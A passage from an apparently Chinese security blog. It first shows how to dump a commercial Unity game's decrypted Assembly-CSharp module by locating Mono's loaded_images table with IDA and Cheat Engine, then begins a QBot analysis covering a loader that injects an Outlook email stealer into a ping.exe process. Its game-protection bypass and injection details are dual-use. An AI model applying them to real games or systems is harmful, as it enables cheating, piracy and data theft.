class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">mono_image_open_from_data_internal</span> (data, data_len, need_copy, status, refonly, FALSE, name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">MonoImage *</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">mono_image_open_from_data_internal</span> <span class=\"params\">(<span class=\"type\">char</span> *data, guint32 data_len, gboolean need_copy, MonoImageOpenStatus *status, gboolean refonly, gboolean metadata_only, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                <span class=\"type\">const</span> <span class=\"type\">char</span> *name)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    MonoCLIImageInfo *iinfo;</span><br><span class=\"line\">    MonoImage *image;</span><br><span class=\"line\">    <span class=\"type\">char</span> *datac;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!data || !data_len) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (status)</span><br><span class=\"line\">            *status = MONO_IMAGE_IMAGE_INVALID;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    datac = data;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (need_copy) &#123;</span><br><span class=\"line\">        datac = (<span class=\"type\">char</span> *)<span class=\"built_in\">g_try_malloc</span> (data_len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!datac) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (status)</span><br><span class=\"line\">                *status = MONO_IMAGE_ERROR_ERRNO;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span> (datac, data, data_len);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    image = <span class=\"built_in\">g_new0</span> (MonoImage, <span class=\"number\">1</span>);</span><br><span class=\"line\">    image-&gt;raw_data = datac;</span><br><span class=\"line\">    image-&gt;raw_data_len = data_len;</span><br><span class=\"line\">    image-&gt;raw_data_allocated = need_copy;</span><br><span class=\"line\">    image-&gt;name = (name == <span class=\"literal\">NULL</span>) ? <span class=\"built_in\">g_strdup_printf</span> (<span class=\"string\">&quot;data-%p&quot;</span>, datac) : <span class=\"built_in\">g_strdup</span>(name);</span><br><span class=\"line\">    iinfo = <span class=\"built_in\">g_new0</span> (MonoCLIImageInfo, <span class=\"number\">1</span>);</span><br><span class=\"line\">    image-&gt;image_info = iinfo;</span><br><span class=\"line\">    image-&gt;ref_only = refonly;</span><br><span class=\"line\">    image-&gt;metadata_only = metadata_only;</span><br><span class=\"line\">    image-&gt;ref_count = <span class=\"number\">1</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    image = <span class=\"built_in\">do_mono_image_load</span> (image, status, TRUE, TRUE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (image == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">register_image</span> (image);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看不懂没关系，我们只需要关注他的<strong>data,data_len,name</strong>这三个参数，这三个分别表示当前被加载模块的二进制内容，二进制长度，模块名。大部分游戏厂商都会在这里判断模块名是否为Assembly-CSharp，然后进行二进制内容解密。那么只需要用调试工具在这个函数下段，然后在这里分析结束的位置，然后直接dump即可。这里放一下大概代码</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>直接在解密完毕的位置下断，然后把rdi给dump出来就行，得到的就是解密后的dll。也可以自写脚本。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>上面介绍了Assembly-CSharp的一种加密和解密方式，虽说是加密，但是非常下饭，基本有手就行。今天就来说说另一种加密方式。小白鼠是国内某款游戏，现在应该应该不开放了，但是游戏依旧躺在我硬盘里。该游戏同样是加密Assembly-CSharp，但是有个不同点就是该文件只有1kb，这个就很可疑，因为这等于说这文件是空的，用十六进制打开文件也能看出里面无内容，那么游戏很可能是联网获取新的，或者是内存释放。那么除了去分析后解密，就没有办法拿到解密后的文件吗，答案是否定的。这个时候就需要上点硬技术了。</p>\n<p>回到Mono的源码，我们需要去分析一下他的一个流程。这里我就不去分析了，有一个帖子已经说得很详细。<a href=\"https://bbs.pediy.com/thread-264444.htm\">[原创]关于Unity游戏Mono注入型外挂的一个检测思路-编程技术-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>\n<p>大家可以看看这个帖子，主要是去熟悉一下mono的一个流程。我也直接请出主角。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> MonoImage *</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">register_image</span> <span class=\"params\">(MonoImage *image)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    MonoImage *image2;</span><br><span class=\"line\">    GHashTable *loaded_images = <span class=\"built_in\">get_loaded_images_hash</span> (image-&gt;ref_only);           <span class=\"comment\">//       重点关注对象</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"built_in\">mono_images_lock</span> ();</span><br><span class=\"line\">    image2 = (MonoImage *)<span class=\"built_in\">g_hash_table_lookup</span> (loaded_images, image-&gt;name);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (image2) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* Somebody else beat us to it */</span></span><br><span class=\"line\">        <span class=\"built_in\">mono_image_addref</span> (image2);</span><br><span class=\"line\">        <span class=\"built_in\">mono_images_unlock</span> ();</span><br><span class=\"line\">        <span class=\"built_in\">mono_image_close</span> (image);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> image2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    GHashTable *loaded_images_by_name = <span class=\"built_in\">get_loaded_images_by_name_hash</span> (image-&gt;ref_only);</span><br><span class=\"line\">    <span class=\"built_in\">g_hash_table_insert</span> (loaded_images, image-&gt;name, image);                       <span class=\"comment\">//       重点关注对象</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (image-&gt;assembly_name &amp;&amp; (<span class=\"built_in\">g_hash_table_lookup</span> (loaded_images_by_name, image-&gt;assembly_name) == <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">        <span class=\"built_in\">g_hash_table_insert</span> (loaded_images_by_name, (<span class=\"type\">char</span> *) image-&gt;assembly_name, image);</span><br><span class=\"line\">    <span class=\"built_in\">mono_images_unlock</span> ();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> image;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里可以清楚的看到，U3D直接把需要的加载的模块插入了一个<strong>HashTable</strong>，然后完成模块的一个装载。这里我们先不管这个模块进行了如何加密和解密，既然你要扔给U3D托管，那么你不可能扔了一个加密模块的给U3D托管，除非你的U3D引擎进行了一个大规模的魔改。所以说，我们只需要找到这个HashTable，然后去遍历一下里面的模块，我们是不是就能拿到解密后的Assembly-CSharp，答案是肯定的。那么现在重点对象从 如何解密Assembly-CSharp变成了 如何使用<strong>loaded_images</strong>。</p>\n<p>我们应该如何去找到这个loaded_images？没办法，上分析。调试器打开游戏跳到<strong>mono_image_open_from_data_with_name</strong>这个函数然后对照源码进行分析。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>从源码得知，register_image是最后一个调用的函数，我们直接找到最后一个函数，进去后分析得知。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>拿到loaded_images后，我们下一步就是要去遍历这个HashTabel,两个办法，一个是自己去搭建<strong>GHashTable</strong>库，然后自己去跑一遍。第二个办法，自己去分析g_hash_table_insert函数的流程。我选择后者 &#x3D;。&#x3D;</p>\n<p>Ida打开mono.dll后搜索<strong>g_hash_table_insert</strong>，有一个</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>进去F5后无脑暴力分析。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>分析了一个大概流程后，打开CE，用数据结构工具分析验证看看</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>很明显，这里应该就是模块列表，我们再随便进去一个去看看。<strong>通过刚刚IDA的分析，0x0是模块名，0x8是image。</strong></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>和我们刚刚分析的一致，现在我们还差一个东西，那就是image的结构，我们在源码查找一下。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_MonoImage</span> &#123;</span><br><span class=\"line\">           ………</span><br><span class=\"line\">           guint32 raw_data_len;</span><br><span class=\"line\">           <span class=\"type\">char</span> *raw_data;                   <span class=\"comment\">//模块二进制</span></span><br><span class=\"line\">           <span class=\"type\">char</span> *name;              <span class=\"comment\">//模块名</span></span><br><span class=\"line\">           …………</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就贴出重要的。问题来了，我们怎么知道他的偏移。别忘了，这里有</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">MonoImage *</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">mono_image_open_from_data_internal</span> <span class=\"params\">(<span class=\"type\">char</span> *data, guint32 data_len, gboolean need_copy, MonoImageOpenStatus *status, gboolean refonly, gboolean metadata_only, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                <span class=\"type\">const</span> <span class=\"type\">char</span> *name)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    MonoCLIImageInfo *iinfo;</span><br><span class=\"line\">    MonoImage *image;</span><br><span class=\"line\">    <span class=\"type\">char</span> *datac;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!data || !data_len) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (status)</span><br><span class=\"line\">            *status = MONO_IMAGE_IMAGE_INVALID;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    datac = data;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (need_copy) &#123;</span><br><span class=\"line\">        datac = (<span class=\"type\">char</span> *)<span class=\"built_in\">g_try_malloc</span> (data_len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!datac) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (status)</span><br><span class=\"line\">                *status = MONO_IMAGE_ERROR_ERRNO;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span> (datac, data, data_len);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    image = <span class=\"built_in\">g_new0</span> (MonoImage, <span class=\"number\">1</span>);</span><br><span class=\"line\">    image-&gt;raw_data = datac;                                                                       &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class=\"line\">    image-&gt;raw_data_len = data_len;                                                                &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class=\"line\">    image-&gt;raw_data_allocated = need_copy;</span><br><span class=\"line\">    image-&gt;name = (name == <span class=\"literal\">NULL</span>) ? <span class=\"built_in\">g_strdup_printf</span> (<span class=\"string\">&quot;data-%p&quot;</span>, datac) : <span class=\"built_in\">g_strdup</span>(name);            &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class=\"line\">    iinfo = <span class=\"built_in\">g_new0</span> (MonoCLIImageInfo, <span class=\"number\">1</span>);</span><br><span class=\"line\">    image-&gt;image_info = iinfo;</span><br><span class=\"line\">    image-&gt;ref_only = refonly;</span><br><span class=\"line\">    image-&gt;metadata_only = metadata_only;</span><br><span class=\"line\">    image-&gt;ref_count = <span class=\"number\">1</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    image = <span class=\"built_in\">do_mono_image_load</span> (image, status, TRUE, TRUE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (image == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">register_image</span> (image);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们ida返回去分析</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__int64 __fastcall <span class=\"title\">sub_18006CA20</span><span class=\"params\">(__int64 data, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> data_len, <span class=\"type\">int</span> need_cpy, _DWORD *status, __int64 refonly, <span class=\"type\">char</span> metadata_only, __int64 name)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 len; <span class=\"comment\">// r14</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// rdi</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v9; <span class=\"comment\">// si</span></span><br><span class=\"line\">  __int64 data_; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 data__; <span class=\"comment\">// rbp</span></span><br><span class=\"line\">  __int64 v12; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v14; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 m_name; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> __int64 v16; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v18; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v19; <span class=\"comment\">// rax</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  len = data_len;</span><br><span class=\"line\">  v8 = status;</span><br><span class=\"line\">  v9 = need_cpy;</span><br><span class=\"line\">  data_ = data;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( data &amp;&amp; data_len )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    data__ = data;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( need_cpy )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v12 = <span class=\"built_in\">sub_180004B80</span>(data_len);</span><br><span class=\"line\">      data__ = v12;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !v12 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">          *v8 = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>i64;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">sub_180314D40</span>(v12, data_, len);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v14 = <span class=\"built_in\">sub_180004AE0</span>(<span class=\"number\">1856</span>i64);</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1C</span>) &amp;= <span class=\"number\">0xFD</span>u;</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1C</span>) |= <span class=\"number\">2</span> * (v9 &amp; <span class=\"number\">1</span>);</span><br><span class=\"line\">    *(_QWORD *)(v14 + <span class=\"number\">0x10</span>) = data__;   <span class=\"comment\">//data</span></span><br><span class=\"line\">    *(_DWORD *)(v14 + <span class=\"number\">0x18</span>) = len;      <span class=\"comment\">//data_len</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( name )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v16 = <span class=\"number\">-1</span>i64;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( *(_BYTE *)(name + v16++ + <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">        ;</span><br><span class=\"line\">      m_name = <span class=\"built_in\">sub_180004A10</span>(name, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v16 + <span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      m_name = <span class=\"built_in\">sub_180006230</span>(<span class=\"string\">&quot;data-%p&quot;</span>, data__);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *(_QWORD *)(v14 + <span class=\"number\">0x20</span>) = m_name;    <span class=\"comment\">//name</span></span><br><span class=\"line\">    v18 = <span class=\"built_in\">sub_180004AE0</span>(<span class=\"number\">408</span>i64);</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1C</span>) &amp;= <span class=\"number\">0xBF</span>u;</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1D</span>) &amp;= <span class=\"number\">0xFE</span>u;</span><br><span class=\"line\">    *(_QWORD *)(v14 + <span class=\"number\">0x50</span>) = v18;</span><br><span class=\"line\">    *(_DWORD *)v14 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1C</span>) |= (refonly &amp; <span class=\"number\">1</span>) &lt;&lt; <span class=\"number\">6</span>;</span><br><span class=\"line\">    *(_BYTE *)(v14 + <span class=\"number\">0x1D</span>) |= metadata_only &amp; <span class=\"number\">1</span>;</span><br><span class=\"line\">    v19 = <span class=\"built_in\">sub_1800699B0</span>(v14, v8, <span class=\"number\">1</span>i64);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v19 )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>i64;</span><br><span class=\"line\">    result = <span class=\"built_in\">sub_18006D6D0</span>(v19);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( status )</span><br><span class=\"line\">      *status = <span class=\"number\">3</span>;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>i64;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可知</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x10</span> raw_data</span><br><span class=\"line\"><span class=\"number\">0x18</span> raw_data_len</span><br><span class=\"line\"><span class=\"number\">0x20</span> name</span><br></pre></td></tr></table></figure>\n\n<p>我们再用CE看看</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>可以看到，直接是一个标准的PE文件，说明这里存的是二进制内容。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>到这里，我们就已经分析完了loaded_images的一个内存结构。接下来就是写一个遍历工具，然后打开游戏，运行工具，等待DLL生成。这里我用易语言写了一个。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p><strong>运行。。。</strong></p>\n<p>原文件</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>dump文件</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p><strong>Dnspy打开</strong></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>到这里，就已经完美提取了。这里的话，个人觉得，也可以提取一些第三方挂钩mono的DLL，但是本人没去试过。有兴趣的可以去试试。输入法和键盘同时出了问题，打字很难受，如果文章中存在错别字，，，见谅。。。。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n","categories":["GameHacker"]},{"title":"QBot-Outlook窃密","url":"/2024/04/21/QBot-Outlook%E7%AA%83%E5%AF%86/","content":"<h1 id=\"QBot-Outlook窃密\"><a href=\"#QBot-Outlook窃密\" class=\"headerlink\" title=\"QBot-Outlook窃密\"></a>QBot-Outlook窃密</h1><h1 id=\"⼀、加载器分析\"><a href=\"#⼀、加载器分析\" class=\"headerlink\" title=\"⼀、加载器分析\"></a>⼀、加载器分析</h1><h2 id=\"1、样本标签\"><a href=\"#1、样本标签\" class=\"headerlink\" title=\"1、样本标签\"></a><strong>1</strong>、样本标签</h2><table>\n<thead>\n<tr>\n<th>病毒名称</th>\n<th>c8810d5eaaea95b36bbb529a2b9be5c5e6dda10f95992e7c35ac8bbf9f3a8f71</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>⽆</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>93d6d599c37d1858cc86c0d8fe8fb8d4</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>222.50 KB (227840 bytes)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>Win32 DLL</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>2020-04-20 23:33:29</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>⽆</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>f85a63cb462b8fd60da35807c63cd13226907901</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>F0A18B09</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、详细分析\"><a href=\"#2、详细分析\" class=\"headerlink\" title=\"2、详细分析\"></a>2、详细分析</h2><p>样本(93D6D599C37D1858CC86C0D8FE8FB8D4)⾃⾝为DLL⽂件,同时也是⼀个加载器。样本⼀旦被加载⾸先获取远线程注⼊所需要的API函数地址。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image1.jpeg\" alt=\"image1\"></p>\n<p>其中样本中的所有字符串都是加密的，通过传⼊字符串对应的id解密出字符串。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image2.png\" alt=\"image2.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image3.jpeg\" alt=\"image3\"></p>\n<p>获取函数之后会通过token设置sid的⽅式进⾏提权。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image4.png\" alt=\"image4.png\"></p>\n<p>根据当前运⾏的环境是否为64位来获取Windows⽬录。接着在⽂件夹<strong>ProgramW6432ProgramFiles(x86)<strong>、</strong>ProgramFiles</strong>中搜索<strong>outlook.exe</strong>⽂件。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image5.jpeg\" alt=\"image5\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image6.jpeg\" alt=\"image6\"></p>\n<p>如果存在outlook.exe⽂件后会根据⾃⾝进程位数来选择32位还是64位模式注⼊。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image7.png\" alt=\"image7.png\"></p>\n<p>注⼊⾸先会创建⼀个<strong>ping.exe</strong>进程作为傀儡，并且运⾏参数为**-t 127.0.0.1**，保证傀儡程序能持续运⾏。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image8.png\" alt=\"image8.png\"></p>\n<p>然后加载名为RES_DATA_1(如果是64位注⼊则为RES_DATA_2)的资源⽂件。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image9.png\" alt=\"image9.png\"></p>\n<h1 id=\"⼆、邮箱窃密模块分析\"><a href=\"#⼆、邮箱窃密模块分析\" class=\"headerlink\" title=\"⼆、邮箱窃密模块分析\"></a>⼆、邮箱窃密模块分析</h1><p>由于32位和64位功能相同，这⾥只分析32位。</p>\n<h2 id=\"1、样本标签-1\"><a href=\"#1、样本标签-1\" class=\"headerlink\" title=\"1、样本标签\"></a><strong>1</strong>、样本标签</h2><table>\n<thead>\n<tr>\n<th>病毒名称</th>\n<th>RES_DATA_1</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>emailcollector.dll</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>9B0A4E5E5227B766EDE92340D7064545</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>84.00 KB (86016 bytes)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>Win32 DLL</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>2020-04-20 23:33:01</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>⽆</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>369EE5FF9960BB9E73503E0B0A4B3A57A96EC549</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>1654A136</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、详细分析-1\"><a href=\"#2、详细分析-1\" class=\"headerlink\" title=\"2、详细分析\"></a>2、详细分析</h2><p>样本(9B0A4E5E5227B766EDE92340D7064545)为核⼼模块，负责窃取outlook的邮箱数据。当样本⾃⾝被成功加载时，与加载器相同。通过GetProAddress获取⼀些API函 数，其中字符串也是被加密状态，使⽤的算法也与加载器相同。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image10.jpeg\" alt=\"image10\"></p>\n<p>初始化完毕后会通过<strong>CreateThread</strong>函数创建⼀个线程，开始进⾏窃密。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image12.png\" alt=\"image12.png\"></p>\n<h3 id=\"2-1、窃密邮箱数据\"><a href=\"#2-1、窃密邮箱数据\" class=\"headerlink\" title=\"2.1、窃密邮箱数据\"></a>2.1、窃密邮箱数据</h3><p>样本⾸先会将当前⼯作⽬录设置为“C:\\User\\USERNAME\\”（该字符串在初始化时获取）</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image13.jpeg\" 